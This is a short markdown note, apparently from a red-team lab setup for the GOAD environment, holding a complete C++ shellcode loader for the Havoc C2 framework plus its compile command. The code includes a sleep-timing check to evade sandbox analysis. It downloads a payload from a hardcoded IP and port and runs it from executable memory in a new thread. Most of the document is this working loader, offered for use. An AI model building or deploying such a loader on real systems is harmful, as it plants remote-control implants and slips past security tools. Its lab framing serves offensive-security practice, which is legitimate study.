# Loader from the interwebs
- I didn't make it, i'm only using it for the GOAD lab
## Source "yl-labs"
https://yl-labs.github.io/posts/red-reaming-havoc-c2/

##### run with
```
x86_64-w64-mingw32-g++ --static havoc-loader.cpp -o havoc.exe -lwinhttp -fpermissive
```

##### Code
```c++
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")

void BypassDynamicAnalysis()
{

	int tick = GetTickCount64();
	Sleep(5000);
	int tock = GetTickCount64();
	if ((tock - tick) < 4500)
		exit(0);
}

std::vector<BYTE> Download(LPCWSTR baseAddress,int port,LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);


    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
	return wString;
}

int main(int argc, char* argv[])
{
    BypassDynamicAnalysis();
    std::vector<BYTE> recvbuf;
    //  EDIT:                <ip>               <port>      <shellcodefile>
    recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/test.bin\0");
    
	LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!alloc_mem) {
		printf("Well... it failed! (%u)\n", GetLastError());
		return -1;
	}

	CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

	DWORD oldProtect;
	if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed sd asd asd asdto change memory protection (%u)\n", GetLastError());
		return -2;
	}

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed thread (%u)\n", GetLastError());
		return -3;
	}
	printf("\n\nalloc_mem address : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	((void(*)())alloc_mem)();

	return 0;

}
```